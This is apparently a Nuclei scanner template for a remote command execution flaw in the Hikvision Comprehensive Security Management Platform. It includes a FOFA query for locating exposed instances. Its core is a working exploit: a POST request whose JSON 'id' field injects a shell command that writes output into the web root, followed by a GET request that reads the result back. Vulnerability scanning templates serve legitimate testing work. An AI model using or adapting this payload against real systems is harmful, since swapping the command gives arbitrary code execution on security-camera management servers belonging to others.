id: hikvision-csmp-installation-rce

info:
  name: Hikvision Comprehensive Security Management Platform Installation RCE
  author: xc
  severity: high
  description: |
    Hikvision Comprehensive Security Management Platform historical versions have a remote command execution vulnerability due to insufficient validation of the installation detection interface. This allows remote attackers to execute arbitrary commands.
  metadata:
    fofa-query: app="HIKVISION-iSecure-Center"
  tags: hikvision-csmp-installation-rce

requests:
  - raw:
      - |-
        POST /center/api/installation/detection HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1249.139 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Connection: close
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/json;charset=UTF-8
        Content-Length: 142

        {"type": "environment", "operate": "", "machines": {"id": "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/3.txt)"}}
        
      - |+
        GET /vms/static/3.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    req-condition: true
    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'contains((body_2), "uid") && status_code_2 == 200' 